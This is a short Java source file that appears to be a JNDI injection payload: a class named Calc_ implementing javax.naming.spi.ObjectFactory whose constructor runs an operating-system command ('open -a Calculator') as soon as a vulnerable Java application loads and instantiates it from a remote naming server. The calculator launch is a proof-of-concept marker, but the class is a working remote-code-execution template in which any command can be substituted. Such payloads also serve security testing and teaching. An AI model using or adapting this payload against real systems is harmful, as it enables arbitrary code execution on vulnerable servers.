import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Calc_ implements ObjectFactory {
    public Calc_() throws IOException {
        Runtime.getRuntime().exec("open -a Calculator");
    }
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                    Hashtable<?, ?> environment) throws Exception {
        return null;
    }

}
